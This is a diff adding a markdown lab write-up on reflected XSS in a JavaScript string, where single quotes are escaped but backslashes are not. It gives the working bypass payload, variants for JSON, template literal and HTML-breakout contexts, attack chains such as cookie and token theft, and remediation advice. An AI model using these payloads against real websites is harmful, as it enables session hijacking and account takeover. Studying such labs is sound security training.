@@ -7903,3 +7903,457 @@ Execute
 → XSS achieved 💥  
 
 ---
+
+# 🐞Lab 20 - Reflected XSS in JavaScript (Escaped Quotes, Backslash Bypass)
+
+---
+
+## 🔹 Overview
+
+This lab demonstrates Reflected XSS inside a JavaScript string where:
+
+- Single quotes `'` are escaped using backslash `\`  
+- Angle brackets `< >` and double quotes `"` are encoded  
+- BUT backslash itself is NOT properly escaped  
+
+---
+
+👉 This creates a bypass opportunity  
+
+---
+
+## 🧠 Core Idea
+
+Protection:
+
+```
+\' 
+```
+
+Weakness:
+
+```
+\ is NOT escaped
+```
+
+👉 Attacker uses `\` to break escaping  
+
+---
+
+## 🔹 What Is This Topic?
+
+JavaScript context XSS with flawed escaping  
+
+---
+
+## 🔄 Flow
+
+1️⃣ User sends input  
+2️⃣ Server places it inside JS string  
+
+```
+var input = 'USER_INPUT';
+```
+
+3️⃣ Server escapes:
+
+```
+' → \'
+```
+
+4️⃣ Browser executes JS  
+
+---
+
+## ⚠️ Problem
+
+You cannot break string normally  
+
+Because:
+
+```
+' → becomes \'
+```
+
+---
+
+## ⚠️ Weakness
+
+Server does NOT escape:
+
+```
+\
+```
+
+---
+
+## 🔹 Core Concepts
+
+---
+
+### 🟢 Escape Character
+
+```
+\  → escape operator
+```
+
+---
+
+### 🟢 Escaped Quote
+
+```
+\' → NOT closing string
+```
+
+---
+
+### 🟢 Backslash Pairing
+
+```
+\\ → one real backslash
+```
+
+---
+
+### 🟢 Weak Escaping Logic
+
+- Escapes `'`  
+- Ignores `\`  
+
+👉 Attacker controls escape chain  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Test Input
+
+```
+XSS123
+```
+
+---
+
+### Step 2 — Observe Reflection
+
+```
+var searchTerms = 'XSS123';
+```
+
+✔ Input inside JS string  
+
+---
+
+## 📸 Screenshot 1 — Normal Reflection
+
+![normal-input](../images/js-backslash-reflection.png)
+
+---
+
+### Step 3 — Try Normal Payload
+
+```
+';alert(1);//
+```
+
+---
+
+### Step 4 — Result (Escaped by Server)
+
+```
+var searchTerms = '\';alert(1);//';
+```
+
+❌ Payload fails  
+
+---
+
+### 🔴 Why It Failed
+
+```
+' → becomes \'
+```
+
+👉 String NOT closed  
+
+---
+
+## 📸 Screenshot 2 — Escaped Payload (Server Adds Backslash)
+
+![escaped-by-server](../images/js-backslash-escaped.png)
+
+---
+
+### Step 5 — Apply Backslash Bypass
+
+```
+\';alert(1);//
+```
+
+---
+
+### Step 6 — Server Transformation
+
+```
+\\';alert(1);//
+```
+
+---
+
+### 🟢 JavaScript Interpretation
+
+```
+\\ → becomes \
+'  → FREE → closes string
+```
+
+---
+
+### Step 7 — Final Execution
+
+String closes → payload executes  
+
+---
+
+## 📸 Screenshot 3 — Final Payload Execution
+
+![final-bypass](../images/js-backslash-final.png)
+
+---
+
+## 💥 Execution Flow
+
+1️⃣ Input injected  
+2️⃣ Server escapes `'`  
+3️⃣ Attacker-controlled `\` breaks escape  
+4️⃣ String closes  
+5️⃣ JS executes  
+6️⃣ alert triggers 💥  
+
+---
+
+## 🔹 Payload Breakdown
+
+---
+
+### 🎯 Payload
+
+```
+\';alert(1);//
+```
+
+---
+
+### Parts
+
+```
+\    → cancels server escape  
+'    → closes string  
+;    → ends statement  
+alert(1) → executes  
+//   → comments rest  
+```
+
+---
+
+## 🧩 Analogy
+
+Server adds lock 🔒  
+
+You add anti-lock ⚔️  
+
+→ Lock breaks → execution happens  
+
+---
+
+## 🔹 Why This Works
+
+- Server escapes only `'`  
+- Does NOT escape `\`  
+
+👉 Escape chain becomes controllable  
+
+---
+
+## 🔹 When This Fails (Real World)
+
+Modern apps may:
+
+- Escape `\` → `\\`  
+- Use JSON encoding  
+- Use frameworks (React, Angular)  
+- Apply CSP  
+- Avoid inline JS  
+
+---
+
+👉 Then this payload FAILS ❌  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Weak Escaping (Same as Lab)
+
+```
+var q = 'INPUT';
+```
+
+Payload:
+
+```
+\';alert(1);//
+```
+
+---
+
+### 🟢 Double Escaping Systems
+
+Payloads to test:
+
+```
+\\';alert(1);//
+\\\';alert(1);//
+\\\\';alert(1);//
+```
+
+---
+
+### 🟢 Strict Escaping (Modern Apps)
+
+Fallback:
+
+```
+</script><script>alert(1)</script>
+```
+
+---
+
+### 🟢 JSON Context
+
+```
+var data = {"name": "INPUT"};
+```
+
+Payload:
+
+```
+\";alert(1);//
+```
+
+---
+
+### 🟢 Template Literal
+
+```
+let msg = `INPUT`;
+```
+
+Payload:
+
+```
+${alert(1)}
+```
+
+---
+
+### 🟢 Universal HTML Breakout
+
+```
+</script><script>alert(1)</script>
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+
+```
+document.cookie
+```
+
+---
+
+### 🔥 Token Theft
+
+```
+localStorage
+```
+
+---
+
+### 🔥 Account Takeover
+
+- Change email  
+- Reset password  
+
+---
+
+### 🔥 Admin Compromise
+
+Send malicious link  
+
+---
+
+### 🔥 API Abuse
+
+Perform authenticated actions  
+
+---
+
+## 🛡️ Remediation
+
+- Escape BOTH `'` and `\`  
+- Use `JSON.stringify()`  
+- Avoid inline JS  
+- Use CSP  
+- Use secure templating  
+
+---
+
+## 💡 Pro Mindset
+
+Escaping ≠ security  
+
+Partial escaping = vulnerability  
+
+---
+
+### Always Test
+
+```
+'
+\
+\\
+\\\
+</script>
+```
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Input  
+→ Reflection  
+→ JS string  
+
+If `'` blocked → try `\`  
+If `\` blocked → try more `\`  
+If all blocked → break HTML  
+If still blocked → change context  
+
+---
+
+## 🎯 FINAL GOLDEN RULE
+
+If backslash is NOT escaped  
+→ it becomes your weapon  
+
+---
